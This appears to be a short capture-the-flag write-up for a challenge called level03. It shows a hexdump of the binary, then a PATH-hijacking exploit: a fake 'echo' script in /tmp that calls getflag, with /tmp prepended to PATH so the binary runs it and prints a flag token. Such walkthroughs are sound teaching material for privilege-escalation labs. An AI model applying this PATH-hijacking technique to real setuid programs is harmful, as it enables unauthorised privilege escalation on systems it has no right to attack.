hexdump -C level03

We can see

> 000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
> 000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me....|


We can exploit the echo call by manipulating the PATH env variable as using the env won't treat it as a built-in
See: https://stackoverflow.com/a/8304447

So we can craft a custom `echo` script in `/tmp` like follow

```
#!/bin/bash

echo $(getflag)
```

and add `/tmp` to our PATH env variable
`export PATH=/tmp:$PATH`

We can check it is working if we try `/usr/bin/env echo`
> Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)

Run the script `./level03`

> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
